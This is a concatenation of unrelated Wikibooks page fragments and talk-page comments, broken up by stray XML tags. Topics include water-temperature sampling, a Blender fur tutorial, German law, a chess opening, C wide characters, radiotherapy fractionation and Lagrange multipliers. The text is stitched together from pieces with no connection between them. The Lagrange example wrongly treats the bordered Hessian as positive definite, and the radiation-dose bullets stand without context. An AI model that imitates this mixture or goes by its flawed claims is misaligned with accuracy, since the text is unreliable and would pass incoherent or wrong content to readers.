This is an auxiliary [[Help:Templates|template]] that allows one to encode the [[Help:Tables|wiki table]] delimiter &quot;&lt;code&gt;|-&lt;/code&gt;&quot; within template parameters and parser functions. If it is not a template parameter or a parser function, just use &quot;&lt;code&gt;|-&lt;/code&gt;&quot;.

It is advisable to use &lt;nowiki&gt;{{!}}-&lt;/nowiki&gt; instead of &lt;nowiki&gt;{{!-}}&lt;/nowiki&gt;.

This would be a better part of the book (chapter/section/example)if it were complete in itself.
Not to seem ungrateful but how about the iris and the pupil?
And, of course, it should be put back together as a finished eyeball for the &quot;Noob&quot;?  
Even though those processes may (or may not) have been addressed elsewhere.

===Overview===

Water temperature is a measure of how warm or cool a body of water is. This plays an important role in the functioning of aquatic ecosystem and influences a wide range of other chemical and physical parameters.  Higher water temperatures decrease the ability of water to hold oxygen, reduce the density of the water (how heavy it is) and may also have a controlling impact on events such as algae blooms. Temperature readings are also used to improve the interpretation of other measured parameters. Higher water temperatures influence the ability of water to hold oxygen, and may influence salinity readings ([[Methods_Manual_for_Salt_Lake_Studies/Salinity]]).  

Factors that influence water temperature include the time of day, season, depth of water and the presence of stratified salinity layers. In some saline lakes the denser underlying layers of brine may trap heat, resulting in a higher water temperature in the deeper layers than in layers of water closer to the surface. Where such 'thermoclines' are recorded, they can indicate the presence of previously unsuspected salinity layers (haloclines).

===Equipment types===

There are several types of equipment used to measure water temperature. The most common are glass thermometers or electronic temperature meters. A glass thermometer is the cheapest method. An accurate electronic temperature meter is quite expensive in comparison. Accurate electronic temperature sensors are also commonly found in multi-sensor CTP meters, where conductivity, temperature and pH are measured together. 

===Sampling temperature===

Red spirit thermometer or temperature meter

Sampling dipper or collection bottle attached to a pole for sampling

Record form and pencil


===To ensure good results===

The thermometer or meter should be calibrated yearly against a certified thermometer. 

Glass spirit thermometers should be checked prior to every use for bubbles in the red spirit or cracks in the glass housing. 

If bubbles or gaps are found in the red spirit, the thermometer should be ‘shaken down’ until the bubbles or gaps disappear. If cracks are found in the glass housing the thermometer should be replaced.

When you collect the water sample, make sure it is at least a metre out from the shore (preferably further out) and from at least 20 cm below the surface. 

Place the thermometer or the meter's probes into the water sample as soon as it is collected and leave in the water until the reading stabilises (this may take up to 2 minutes). 

Record the reading 

If the water is deep, you may like to take several samples from different depths to construct a graph of the temperature variation with depth.

      <text xml:space="preserve">== Harry's &quot;old nightmare&quot; ==

A couple of times, we've had an editor say that &quot;Harry's old nightmare&quot;, mentioned in this chapter, was &quot;- actually its the laugh and his parents vanishing in a flash of green light after he looks in the mirror of erised&quot;. There is no mention that Harry had ever had nightmares about flashes of green light, and Harry's parents did not vanish in the Mirror Erised; how could they, after all, if the mirror shows &quot;only your heart's desire&quot;? In fact, no recurring nightmares are mentioned in the book at all; it's only with ''Order of the Phoenix'' that we start seeing a recurring nightmare, and there it isn't really his nightmare at all, but Voldemort's.

===2. e4===
The type of approach one might expect to be successful against the Dutch in view of the weak h5-e8 diagonal. Practice has shown that Black has adequate resources and it difficult for white to show much after a skirmish to recover the pawn sacrifice.

      <text xml:space="preserve">German law is the law of Germany. Germany's law system has considerably changed in the years after the first World War. Beforehand it was a monarchy with an emperor and a kind of parliament called &quot;Bundesrat&quot; (federal council). Do not confuse it with the nowadays &quot;Bundesrat&quot;! Then, in 1918/1919 Germany became a democratic republic. It got a quite liberal constitution (&quot;Deutsche Verfassung von 1919&quot; or -- mostly -- &quot;Weimarer Reichsverfassung&quot;). However, when Hitler became Chancellor he used the democratic system to erode it itself. The democratic republic changed to a dictatorship resulting in the second World War. 1945 WWII ended and the Allies intervened and took action in the legal system of Germany: They abolished laws from the Nazis which was not appropriate, mostly because it was racist. Then there was established the Parliamentary Council (&quot;Parlamentarischer Rat&quot;). It was constituted to form a new constitution. This happened in 1949 with the announcement of the &quot;Grundgesetz für die Bundesrepublik Deutschland&quot; (abbr.: GG; Basic Law for the Federal Republic of Germany). So, Germany is a democratic and federal social state (Art. 20 GG). It is also governed by the rule of law but that is not stated literally in the constitution. It is deduced from the way of law-making, the separation of powers, the basic rights and a lot more.

The law system in Germany is -- in contrast to the English legal system -- an inductive system. That means that law does not derive from decisions of judges but from the parliament. Although that is the main source of law today in the English legal system as well, there are differences. Judges in Germany are not allowed not to apply laws from the parliament -- even when they think it is not just. They can only ask the Federal Constitutional Court of Germany to declare it unconstitutional.

== Explanatory notes ==
In this book it can happen that there will be used the German system of referencing to laws. Therefore here is an overview:
{| class=&quot;wikitable&quot;

|-
| Art. || Artikel || article || used to point out the importance or when there is needed an additional hierarchy
|-
| § || Paragraph || section || It is not literally translated. But they are used equivalently.
|-

|-
| Alt. || Alternative || alternative || &amp;nbsp;
|-
| Var. || Variante || alternative || Mostly used when there are more than two alternatives because &quot;alternative&quot; just means that there are exactly two options if you translate it literally from the Latin origin.

== plain talk ==
I renamed the variables in &quot;ststr&quot; as recommended at [http://communitywiki.org/PlainTalk CommunityWiki: PlainTalk].
This is a functionally-identical refactoring.
Since compilers will produce identical code no matter what you name the variables, we might as well use human-understandable variable names like &quot;haystack&quot;, &quot;needle&quot;, &quot;source&quot;, &quot;dest&quot; rather than &quot;s1&quot; or &quot;s2&quot;.

== wchar_t ==

Is not &quot;16 bit (at least)&quot;, wchar_t should be able to handle at least char values. But wchar_t often wider, than just char, and has 16/32 bit width.

And about encodings: it's necessary to say that wchar_t is only INTERNAL representation for wide strings and has no deal with external encoding in system. How to get wchar_t from outer world and how to print wide characters depends on selected locale and conversion between internal representation and external encoding done automatically by wide character I/O functions such as wprintf, wscanf etc. The only conditions is that external locale should be loaded properly by setlocale (LC_ALL, &quot;&quot;); and, of course, input should be in that locale.</text>

''There is an older version of this page created with [[Blender 3D: Noob to Pro/Furry 2.40|Blender v2.40]].''

(NOTE:  '''New:''' marks 
{{B3D:N2P/ForVersion|2.69}} Notes added for newer versions.  I'm not an expert but they seem to work.)

[[File:Blender3D FurWithParticles-Finished-2.48a.jpg|thumb|300px|'''Figure 1:''' The result of this tutorial: some furry thing]]

This tutorial deals with fur, i.e. lots of relatively short hairs covering a body. We will use particles to create the fur, and discuss a few aspects here:
* How to determine the length and the thickness of the hair.
* How to determine the place to grow the hair.
* How to color hair.
* How to render efficiently. 

The particle system is far too complex to show more than one method in this tutorial. You can achieve many of the same effects shown here in different ways.

{{clr}}
== The emitter ==
[[File:Blender3D AddAParticleSystem-2.48a.png|framed|'''Figure 2a:''' Adding a particle system.]]
* Remove the cube.
* Add an ''UVSphere''. This will become our emitter. 
* Change to the ''Particle'' buttons in the ''Object'' buttons ('''Fig.&amp;nbsp;2a'''). '''New:'''  looks like [[File:Blender255ParticlesContextButton.png|20 px]] in newer versions.
* Click on ''Add New''. '''New''':  Click on 	[[File:Blender268CirclePlusIcon.png|20 px]] in newer versions.
* Rename the particle system to &quot;Fur&quot;.
* Change the particle system type to ''Hair''.
A ''Hair'' particle system has a lot of specialties, the most important thing is that we can edit the particle &quot;motion&quot; by hand if we want to. Apart from that normal particle physics apply, so everything a particle does hair can do also and vice versa. A particle hair shows the way of the particle during it's lifetime at once. To do that efficiently not every single frame is rendered as a point, but a certain number of control points are calculated. Between these control points there will be drawn an interpolated path. The number of control points is the number of segments + 1. 

{{clr}}
[[File:Blender3D ParticleSystemForFur-2.48a.png|framed|'''Figure 2b:''' Particle system settings]]
For fur you need lot's of particles, like 1.000.000 upwards. This will hurt us badly if we have to deal with so many particles in the 3D window and want to render it. Therefore we will create the great amount of particles with so called &quot;children&quot;, that mimic the behavior of their parents. The amount of particle parents should be as low as possible, but you need a certain amount to control the distribution of the hair. We will also use as little control points as possible, three segments should be enough for short fur.
* Set the ''Amount'' to 1000.
* Set the number of ''Segments'' to three. '''New''' I can't find this in 2.69.
* ''Emit from:'' '''New'''  I can't find this in 2.69
** ''Random'':''Faces''
** ''Even''  :''Random''

This will create a nice, uniform distribution. 

Let the hair grow - the hair shows the path of the particle: 
* Set ''Normal'' to 0.05. '''New:'''  Hair Length under Emission.
* ''Random'' 0.005
Nothing special here: the hair grows in the direction of the face normals. Length and direction are a bit randomized.

The ''Visualization'' type changes automatically to type ''Path'' if you select a hair particle system. If you would render now, you couldn't see the emitter object any more. 
* Activate ''Emitter'' in the ''Visualization'' panel. '''New:''' In the Render panel.
* Activate ''Strand Render''. '''New:''' In the Render panel.
The ''Strand Render'' (which I have baptized ''keypoint strands'' to differentiate from the &quot;normal&quot; ''polygon strands'') renders the hair strands extremely efficiently and magnitudes faster than the normal strand. It is the only way to handle many hairs in terms of memory consumption. But it has a few disadvantages:
:- They are not seen by raytracing, so you don't get raytracing reflections and no raytracing shadows. You can use environment mapping to compute the reflections and ''Spot Lamps'' with buffer shadows for the shadow.
:- If the hair is very thick (like 1 BU) sometimes the shape is not correct.

* Activate ''Children from Faces''. '''New:''' I chose Simple under children.
* ''Amount:'' 5 This is the amount of children particles for each parent. 
* ''Render Amount:'' 50 This is the amount of particles during the render. 
* ''Rough 2:'' 0.1 '''New:''' I used ''Roughness &gt; Random'' for this setting.   Random variation of the shape of the particles. So the hairs will not stand plain upright and appear a bit curly. 
The parent particles are not rendered by default, so now we have 5.000 Particles that render on my old machine in 6 seconds. If we use 1.000 children we have 1.000.000 particles, that need approx. 1 GB of RAM and render in 1:42 minutes. If you render ''keypoint strands'' with ''Children from Faces'' you can also use ''Child simplification'', which will reduce the amount of particles on objects far away from the camera automatically. '''New:''' Don't see this.  

{{clr}}
[[File:Blender3D FurWithParticles-NoMaterial-2.48a.jpg|thumb|300px|'''Figure 2c:''' The first render without material.]]
Now we should change the lighting to get a preview.
* Select the lamp.
* Change to the ''Lamp'' buttons.
* Change the lamp type to ''Spot''.
* Change the shadow type to ''Buf. Shadow''
* Change the buffered shadow type to ''Classic-Halfway''. 
This is a great shadow type that renders keypoint strands very well and creates fewer artifacts than ''Classical'' (In my opinion). 
I have inserted two other lamps and used a classical three point lighting for the first rendering ('''Fig.&amp;nbsp;2c'''). 


[[File:Fur settings.png|thumb|200 px|left|Click on image to see larger version.]]
'''NEW:'''
{{B3D:N2P/ForVersion|2.69}}
Here are the settings I used and the render result I got.  (Click to enlarge the image and read the settings.)

{{clr}}

== Material ==
In the material buttons you can set different aspects for the strands:
:- their width and form
:- the used shader
:- the base color 
:- a texture along the strand
:- different particle attributes like length, density or roughness

* Add a material to the emitter.
* Name the material &quot;Fur&quot;. 

=== Strands Shader ===
[[File:Blender3D StrandsShaderSettings.png|framed|'''Figure 3a:''' ''Strands'' settings in the material buttons.]]
The default strands settings for ''Keypoint strands'' are shown in '''Fig.&amp;nbsp;3a'''. Take a look in the [http://wiki.blender.org/index.php/Doc:Manual/Materials/Properties/Strands Manual about Strands] for an explanation of all settings. 

* Change the ''End'' value to 0.25, this will make the hair more spiky (not shown in '''Fig.&amp;nbsp;3a'''). 
{{B3D:N2P/Note|''Surface Diffuse:'' It might be easier to achieve a good lighting environment if you check ''Surface Diffuse.'' With ''Surface Diffuse'' turned on, hair does not show as many highlights, which may be too bright without it. I've seen many great examples of fur that use this parameter. However, you have to decide right at the beginning whether you want to use it because it affects all the other material settings. This is something you have to decide for yourself.}}

=== Giving the hair its base color ===
[[File:Blender3D FurTexture for FurTutorial.png|thumb|200px|'''Figure 3b:''' Fur color texture]]
Strands are rendered with the material of the underlying face/vertex, including shading with an UV-Texture. Since you can assign more than one material to each face, each particle system may have its own material and the material of the underlying face can be different from the material of the strands. We will use an UV texture and use it for the surface of the emitter as well as for the color of the hair.

* Change to ''Front'' view in the 3D window (''View-&gt;Front'').
* Make sure you are in ''Orthographic'' view mode (also in the ''View'' menu).
* Change to ''Edit'' mode of the sphere.
* Press '''U''' to unwrap, select ''Sphere from View''. This is a quick and well working method to correctly unwrap a sphere the easy way. 
You don't need to assign a texture in the ''UV/Image Editor'', we only need the coordinates now.

[[File:Blender3D FurWithParticles-ColorTexture-2.48a.jpg|thumb|300px|'''Figure 3c:''' Emitter with color texture.]]
* Add a texture to the material, name it &quot;FurColor&quot;.
* Set ''Map Input'' to ''UV''.
* Go to the ''Texture Buttons'' and set ''Texture-Type: Image''.
* Load an image texture. I have used the image in '''Fig.&amp;nbsp;3b'''.
Normally I would just stop here, I think the material is good enough. But if you want to make the fur more fluffy and soft, you should a second texture along the strand, which changes the alpha value. 

{{clr}}
[[File:Blender3D StrandFadeSettings.png|thumb|400px|'''Figure 3d:''' Settings for a texture along the strand.]]
If you want to do that:
* Activate ''ZTransp''.
* Add a second texture.
* ''Map Input:'' ''Strand''
* ''Map To:'' ''Alpha'' and ''Spec'', ''DVar''=0
* Use a blend texture (''Linear'' or ''Quad'')
You can change all other properties this way, for example the color along the strand (bleached tips).

== Changing Hair length with a texture ==
At first I will show you how to render the emitter mesh with a different material than the strands. Then I will show how to change the length of the hair with a texture semi-interactively.
* Change to the ''Editing'' Buttons.
* Change to ''Edit'' mode.
* In the ''Links and Materials'' panel click on ''New'' in the material section (see '''Figure 4a''').[[File:Blender3D FurWithParticles-ButtonToClick-2.49a.png|thumb|300px|'''Figure 4a:''' Button to click]]
* Make sure all vertices are selected.
* Click on ''Assign''. 
* Change back to ''Object'' mode.
Now the emitter bears a second material.
* Return to the material buttons. 
* In the ''Links and Pipeline'' panel click on the '''X''' next to the material name (''Deletes link to this Datablock'').
* Add a new material.
* Name it ''Emitter''.

Now you have a new material on your emitter object. Since the particle system uses material no.&amp;nbsp;1 you can use different settings for the emitter.

[[File:Blender3D FurWithParticles-TexturePainting-2.48a.png|thumb|300px|'''Figure 4b:''' Texture painting]]
We have already unwrapped the emitter, this is something that will probably be the case also for any real models. Now we will use an UV-Image and texture painting to determine the hair length.
* Split the 3D window.
* Change the right hand side to an ''UV/Image-Editor'' window. 
* Change to edit mode of the emitter object.
* In the ''UV/Image-Editor'' use ''Image-&gt;New...'' and confirm the default settings. This will create a new image, that we will paint on.
* Click on the package icon in the windows header of the ''UV/Image-Editor'' window. Confirm.
* Change the object to ''Texture Paint'' mode.  '''Noob Note:''' ''In the 3D Window, click on the drop down menu.  Change it to '''''Texture Paint'''.
Now you see the texture on the object. 
* Paint a structure on the object. 
* Change back to object mode.
* Go to the ''Material'' buttons.
* Change the active material to ''Fur'' (click on the arrows in the ''Links and Pipeline'' buttons where it reads ''2 Mat 2'').

[[File:Blender3D FurWithParticles-ParticleLengthSettings-2.48a.png|framed|'''Figure 4c:''' Material settings for setting the particle length with a texture.]]
* Create another texture. Name it ''FurLength''.
* Set ''Map Input'' to ''UV''.
* Set ''Map To''
** Turn ''Col'' off.
** ''PAttr''
** ''Length''
** ''DVar=0'' All the white areas on the texture will produce a particle length of 0.
* Load the image texture that we have painted.
{{clr}}
[[File:Blender3D FurWithParticles-ParticleLengthTexture-2.48a.jpg|thumb|300px|'''Figure 4d:''' Controlling particles with a texture: result]]
The result is shown in '''Fig.&amp;nbsp;4d''', you can also see the particles change in the 3D window.

There would have been other ways to achieve this result, e.g. with vertex groups or with particle editing. But I like to work with textures, because you have very fine control and may change the strength of the effect at any time. Vertex groups don't allow for such fine control or you need very many vertices in the emitter. Particle editing (what we will do in the next step) is lost if you change the base particle settings late on, and you can't change it's effect so easily. 

{{clr}}

== Comb it! ==
[[File:Blender3D FurWithParticles-Combing-2.48a.png|framed|'''Figure 5a:''' Combing in ''Particle Mode'']]

An effect that is often underestimated is the importance to comb fur in the natural directions. Fur doesn't simply stand upright, and it also doesn't follow gravity (or only to a small amount). So back to the particle system!

* Change back to the ''Particle buttons''. 
* Click on ''Set Editable'' in the ''Particle System'' panel.
* Change to ''Particle Mode''.
''Particle Mode'' only appears if you have made the particle system editable, and only hair systems can be made editable.
There are a few lifesavers to know when working in ''Particle Mode''.
:- you can edit only the control points (remember the setting ''Segments'' from the beginning of this tutorial)
:- you can only edit parent particles, so you need enough parents for good control
* Activate ''Limit selection to visible'' 
* Activate ''Point select mode'' for even finer control.
Both settings are in the window header of the 3D window. 
* Open the ''Particle Edit Properties'' panel with '''N''' key in the 3D window.
* Select ''Comb''.
You have quite a few different tools at hand in ''Particle Mode'', see the [http://wiki.blender.org/index.php/Doc:Manual/Physics/Particle_Mode manual on Particle Mode]. 
* Comb the hair following the natural flow.

On the example sphere I have used here it is a bit difficult to tell what the natural flow should be ;-). So I have just very carefully combed and changed the length at a few places a bit. You find the rendered result in '''Fig.&amp;nbsp;1''', the Blend file is linked below.

      <text xml:space="preserve">== New version March 2009 ==
I' will try and update the tutorial for v2.48a. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 11:55, 20 March 2009 (UTC)

== The eyes and mouth ==

HElp!Did this happen to anyone else? when i finished the painting for the mouth and eyes, on the render, the hair is gone and i am left with ha blank spot where they should be, but The background, like the color of the emitter is the same zebra pattern, can anyone tell me why this happens? I use 2.49a
== Lost and... lost ==
Maybe it's because of v2.49b, or I'm an utter newbie, but I ended up in a total mess.  I Managed to load the zebra!!! But it was tiled. Wasn't I working on another texture and material when I loaded the stripy horse flesh... I'll never know.  Painting the face? How...I had a big zebra crossing in the way.  Needs to be a little more newbie friendly but... maybe I was tired and missed something.
--[[Special:Contributions/94.172.14.8|94.172.14.8]] ([[User talk:94.172.14.8|talk]]) 19:54, 7 October 2009 (UTC)

== PAttr ==

I'm using Blender version 2.49b (current stable). When trying to modify the hair length with a texture, I am told to activate the PAttr button in the Map To tab. However, this button doesn't appear to be there. Does anyone have a suggestion on this? --[[User:Erispre|Erispre]] ([[User talk:Erispre|talk]]) 17:20, 27 November 2009 (UTC)

Solved: It appears I have not correctly applied the materials. Precisely following the instructions works perfectly well. --[[User:Erispre|Erispre]] ([[User talk:Erispre|talk]]) 18:19, 27 November 2009 (UTC)

== Texture ==
Somebody wrote:
: ''(noob note): I'm trying to follow you on this, but you just say &quot;add a second texture&quot; what texture should I add?  The image you show for the rest of the steps doesn't seem to match up with any of the options I can select.''
:: First you add a texture, without choosing it's type. Than you set the material options for the texture. And a last you select an actual texture, here a blend-texture. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 16:18, 9 December 2009 (UTC)

== Using a texture to create the face/pattern ==
I tried this bit multiple times and never got it to work.  There is a lot of switching materials and textures, none of which is very clear to me.  I've worked my way through the whole book and this is the first part I absolutely cannot get to work.  I simply don't get why I'm doing the things I'm told to, and they don't seem to work in the end anyway.  Why did I create a second material after &quot;fur&quot; in object buttons and then go to materials buttons only to delete the data block link to it?  Then create a new material there and name it &quot;emitter&quot;?  I'm totally clueless.  Then switch back to fur and create a new texture, &quot;furlength&quot; with no type but map input UV and map to the Particle Attribute stuff?  Lost... (2.49b)--[[User:WithAlligators|WithAlligators]] ([[User talk:WithAlligators|talk]]) 22:08, 4 March 2010 (UTC)

It's true, the step seems redunant, but you should follow the steps as provided. I have just completed the Tutorial with pretty good success. The face is a doozy but things to remember:

Emitter = The UV sphere you build.
If you never rename it, fine, but make sure it that whatever it is called, it is linked to. Image 3A is hiding the OB entry, but make sure that has the OB sphere or whatever named in it. 

I have now a brushed version of picture 4.D, but cannont get the final image with the orange eye's &amp; mouth. That part is proving elusive.
(2.49b)--[[User:Naxius|Naxius]] ([[User talk:Naxius|talk]])15:13, 10 March 2011 (+10GMT)

== Strand colour ==

The article says you can change the strand colour differently to the face colour but how?

I think what you have to do is apply the texture of the strand as described in the tutorial, then go into editmode, select the vertices of the emitter, make another material, and apply it to the emitter.

== Could we get an update? ==

Blender has changed a lot in the past few years, so maybe it's time to update this page.  It's rather confusing and frustrating for a new user to look at this page and try to understand what the original author was trying to say.

      <text xml:space="preserve">This page is in serious need of attention.  I have gone through and tried to make at least some of the TeX code parse correctly. But I have run out of energy for this today.   Here are some problems that still  exist on this page.  
#Lots of TeX code outside &lt;nowiki&gt;&lt;math&gt; &lt;/math&gt;&lt;/nowiki&gt; tags.
#When there are &lt;nowiki&gt;&lt;math&gt; &lt;/math&gt;&lt;/nowiki&gt; they get used incorrectly, often as parenthesis. Causing strange display problems.
#TeX style quotation marks are often used outide of math environments (that is &lt;nowiki&gt;`` and ''&lt;/nowiki&gt;)  which lead to strange italics.
#There are some mathematical errors throughout.  
#When specifying sets often there is simply a { instead of \{ so the braces don't appear.  The arrow symbol is used as the set builder &quot;such that&quot; so for example the set of integers greater then five may be type set as &lt;math&gt;{a\in\mathbb{N}\to a&gt;5}&lt;/math&gt; instead of &lt;math&gt;\{a\in\mathbb{N}\mid a&gt;5\}&lt;/math&gt; or &lt;math&gt;\{a\in\mathbb{N} : a&gt;5\}&lt;/math&gt;.
#Nonstandard tex commands are used so they fail to parse, as the cleanup tag currently points out.  I have decided that \polyspace should just become a capital ''P''.  There are also things like &quot;\map{f}{N}{R}&quot; for &quot;f:N\to R&quot; and &quot;\nbym{2}{3}&quot; for &quot;2\times 3&quot;. 
#There are a few places where the grammer is questionable.

The copyright templates are not correct. I will supply templates usable on commons.wikimedia.org. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 15:42, 20 March 2009 (UTC)

I'm fuzzy on this whole topic, but I think the current policy, is that you should license your own work under GFDL and a CC license (I forget which one). Someone more knowledgeable please update this page in the &quot;type 3&quot; section. Thanks,  - [[User:JasonWoof|JasonWoof]] ([[User talk:JasonWoof|talk]]) 15:50, 19 July 2009 (UTC)

== Copyright in a grid? ==

&quot;These images contain things like grids (in 3D view)&quot;

I don't see how a grid by itself is [[commons:template:PD-ineligible|original enough]] to attach Blender's copyright to an image cropped to show only the 3D view. --[[User:Damian Yerrick|Damian Yerrick]] ([[User talk:Damian Yerrick|talk]]) 20:48, 23 July 2010 (UTC)</text>

== Introduction ==

Modern civilization is quite advanced with the advent of industrial manufacturing, electricity, and the free flow of information.  A lot can be accomplished to a degree that trivializes [[The Seven Wonders of the World]], with feats of knowledge, science and engineering.  The technology also aids our modern lives, making us more productive and powerful than before.

The technology comes at great cost - if access to it is removed, society will be severely crippled with no effective means of production or sustenance.  While most civilians in this environment have experienced a temporary loss through power brownouts and blackouts, there has not been one on a more permanent scale.  

The causes for the loss range from a resource loss (such as generation of electrical power), to something drastic (such as being stranded on an island or different planet and having no rescue), to violent (such as global warfare, with or without nuclear weaponry.)  In each of these three scenarios, you may or may not have access to supplies or pre-loss technology.  

The objective of this book is to provide a method to recover from the loss and rebuild civilization.  The difficulty for this will vary - you may have access to resources and arable land, or you may instead have to make due within a desert.  Survival is usually possible as long as you can produce or collect enough food on a yearly basis; however, the secret on thriving is learning how to rebuild or replace the lost technology.

== Outline ==

*Majority of retrospective data suggests that large fractional doses result in better outcomes than small fractional doses
*Two randomized trials were performed. Dutch trial compared large fractional doses (9 Gy vs. 5 Gy) and found no difference. RTOG compared large vs smaller fractional doses (8 Gy vs 2.5 Gy) and similarly found no difference
*Best conclusion that can be drawn is that at least 2.5 Gy/fx should be used

A key application of calculus is in optimization: finding maximum and minimum values of a function, and which points realize these extrema.

=== Context ===
Formally, the field of mathematical optimization is called ''mathematical programming,'' and calculus methods of optimization are basic forms of [[w:nonlinear programming|nonlinear programming]]. We will primarily discuss finite-dimensional optimization, illustrating with functions in 1 or 2 variables, and algebraically discussing ''n'' variables.
We will also indicate some extensions to [[w:infinite-dimensional optimization|infinite-dimensional optimization]], such as [[w:calculus of variations|calculus of variations]], which is a primary application of these methods in physics.

=== Techniques ===
Basic techniques include the first and second derivative test, and their higher-dimensional generalizations.

A more advanced technique is Lagrange multipliers, and generalizations as Karush–Kuhn–Tucker conditions and Lagrange multipliers on Banach spaces.

=== Applications ===
Optimization, particularly via Lagrange multipliers, is particularly used in the following fields:
* Physics
** Particularly the Lagrangian formulation of classical mechanics.
* [[w:Neoclassical economics|Neoclassical economics]]
** In neoclassical economics, many problems have been framed as maximization problems following the very influential 1947 text ''[[w:Foundations of Economic Analysis|Foundations of Economic Analysis]],'' by [[w:Paul Samuelson|Paul Samuelson]].

Further, several areas of mathematics can be understood as generalizations of these methods, notably [[w:Morse theory|Morse theory]] and [[w:calculus of variations|calculus of variations]].

=== Terminology ===
* Input points, output values
* Maxima, minima, extrema, optima
* Stationary point, critical point; stationary value, critical value
* Objective function

* Constraints – equality and inequality
** Especially sublevel sets
** Feasible region, whose points are candidate solutions

== Statement ==
This tutorial presents an introduction to optimization problems that involve finding a maximum or a minimum value of an [[w:Optimization (mathematics)|objective function]] &lt;math&gt;f(x_1,x_2,\ldots, x_n)&lt;/math&gt; subject to a constraint of the form &lt;math&gt;g(x_1,x_2,\ldots, x_n)=k&lt;/math&gt;.

==Maximum and minimum==
Finding optimum values of the function &lt;math&gt; f(x_1,x_2,\ldots, x_n)&lt;/math&gt; without a constraint is a well known problem dealt with in calculus courses. One would normally use the gradient to find [[w:stationary point|stationary point]]s. Then check all stationary and [[w:Boundary (topology)|boundary points]] to find optimum values.

===Example===
* &lt;math&gt; f(x,y)=2x^2+y^2 &lt;/math&gt;
* &lt;math&gt; f_x(x,y)=4x=0 &lt;/math&gt;
* &lt;math&gt; f_y(x,y)=2y=0 &lt;/math&gt;
&lt;math&gt;f(x,y)&lt;/math&gt; has one stationary point at (0,0).

==The Hessian==
A common method of determining whether or not a function has an [[w:extreme value|extreme value]] at a stationary point is to evaluate the hessian of the function at that point. where the [[w:Hessian matrix|hessian]] is defined as

: &lt;math&gt;H(f)= \begin{bmatrix}
\frac{{\partial}^2 f}{\partial x_1^2} &amp; \frac{{\partial}^2 f}{\partial x_1 \partial x_2} &amp; \dots &amp; \frac{{\partial}^2 f}{\partial x_1 \partial x_n} \\
\frac{{\partial}^2 f}{\partial x_2 \partial x_1} &amp; \frac{{\partial}^2f}{\partial x_2^2}&amp; \dots &amp; \frac{{\partial}^2f}{\partial x_2 \partial x_n}\\
\vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
\frac{{\partial}^2f}{\partial x_n \partial x_1} &amp; \frac{{\partial}^2f}{\partial x_n \partial x_2}&amp; \dots &amp; \frac{{\partial}^2f}{\partial x_n^2}\\
\end{bmatrix}. &lt;/math&gt;

==Second derivative test==
The [[w:Derivative|Second derivative]] test determines the optimality of stationary point &lt;math&gt;x&lt;/math&gt; according to the following rules [2]:
* If &lt;math&gt;H(f)&gt;0 &lt;/math&gt; at point x then &lt;math&gt;f&lt;/math&gt; has a [[w:Maxima and minima|local minimum]] at x
* If &lt;math&gt; H(f) &lt; 0 &lt;/math&gt; at point x then &lt;math&gt;f&lt;/math&gt; has a local maximum at x
* If &lt;math&gt; H(f) &lt;/math&gt; has negative and positive eigenvalues then x is a [[saddle point]]
* Otherwise the test is inconclusive
In the above example.

: &lt;math&gt; H(f)=\begin{bmatrix}
4 &amp; 0\\
0&amp; 2
\end{bmatrix}. &lt;/math&gt;

Therefore &lt;math&gt;f(x,y)&lt;/math&gt; has a minimum at (0,0).

      <comment>H(L) was zero before ! It had zero raw</comment>
      <text xml:space="preserve">The method of Lagrange multipliers solves the constrained optimization problem by transforming it into a non-constrained optimization problem of the form:
* &lt;math&gt;\operatorname{\mathcal{L}}(x_1,x_2,\ldots, x_n,\lambda)= \operatorname{f}(x_1,x_2,\ldots, x_n)+\operatorname{\lambda}(k-g(x_1,x_2,\ldots, x_n))&lt;/math&gt;
Then finding the gradient and hessian as was done above will determine any optimum values of &lt;math&gt;\operatorname{\mathcal{L}}(x_1,x_2,\ldots, x_n,\lambda)&lt;/math&gt;.

Suppose we now want to find optimum values for &lt;math&gt;f(x,y)=2x^2+y^2&lt;/math&gt; subject to &lt;math&gt;x+y=1&lt;/math&gt; from [2].

Then the Lagrangian method will result in a non-constrained function.
* &lt;math&gt;\operatorname{\mathcal{L}}(x,y,\lambda)= 2x^2+y^2+\lambda (1-x-y)&lt;/math&gt;

The gradient for this new function is
* &lt;math&gt;\frac{\partial \mathcal{L}}{\partial x}(x,y,\lambda)= 4x+\lambda (-1)=0&lt;/math&gt;
* &lt;math&gt;\frac{\partial \mathcal{L}}{\partial y}(x,y,\lambda)= 2y+\lambda (-1)=0&lt;/math&gt;
* &lt;math&gt;\frac{\partial \mathcal{L}}{\partial \lambda}(x,y,\lambda)=1-x-y=0&lt;/math&gt;

Finding the stationary points of the above equations can be obtained from their matrix from.

: &lt;math&gt; \begin{bmatrix}
4 &amp; 0 &amp; -1 \\
0&amp; 2 &amp; -1 \\
-1 &amp; -1 &amp; 0
\end{bmatrix} \begin{bmatrix}
x\\
y \\
\lambda \end{bmatrix}= \begin{bmatrix}
0\\
0\\
-1
\end{bmatrix}
&lt;/math&gt;

This results in &lt;math&gt;x=1/3, y=2/3, \lambda=4/3&lt;/math&gt;.

Next we can use the hessian as before to determine the type of this stationary point.

: &lt;math&gt; H(\mathcal{L})=
 \begin{bmatrix}
4 &amp; 0 &amp; -1 \\
0&amp; 2 &amp; -1 \\
-1&amp;-1&amp;0
\end{bmatrix}
&lt;/math&gt;

Since &lt;math&gt; H(\mathcal{L}) &gt;0 &lt;/math&gt; then the solution &lt;math&gt;(1/3,2/3,4/3)&lt;/math&gt; minimizes &lt;math&gt;f(x,y)=2x^2+y^2&lt;/math&gt; subject to &lt;math&gt;x+y=1&lt;/math&gt; with &lt;math&gt;f(x,y)=2/3&lt;/math&gt;.

      <text xml:space="preserve">Phorcys was a primeval Greek Sea god. He was said to be the son of Pontus and Gaia. His wife was Ceto, and it was said that all the children they had were monsters. Their children were known as the Phorcydes which included the Gorgons and Scylla. Phorcys is depicted as a fish-tailed Merman.

==An Idea==
...I've been mulling over for some time now: who here would be interested in contributing to a book (specifically a collection of interviews) conducted with Protestant clergy?  The questions would be set.....pre-determined, but contributors would have to conduct face-to-face interviews.....and contribute verbatim transcripts here. Any takers?

      <text xml:space="preserve">==Copyright?==
